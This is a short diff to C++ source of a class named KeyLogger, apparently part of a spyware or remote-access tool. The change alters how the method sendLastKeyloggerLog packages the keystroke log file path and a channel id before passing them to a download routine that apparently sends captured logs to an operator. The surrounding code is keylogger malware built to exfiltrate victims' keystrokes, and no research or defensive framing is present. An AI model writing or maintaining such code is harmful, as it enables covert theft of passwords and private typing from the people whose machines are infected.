@@ -180,7 +180,8 @@ bool KeyLogger::logsExists() const {
 void KeyLogger::sendLastKeyloggerLog(nlohmann::json json) {
     if (lastLogExists()){
         nlohmann::json jsonObject;
-        jsonObject["from_path"] = Converter::wstring2string(logsFileName);
+        std::vector<std::string> vec(1, Converter::wstring2string(logsFileName));
+        jsonObject["from_path"] = vec;
         jsonObject["channel_id"] = json["channel_id"];
         download.downloadContent(jsonObject);
     }
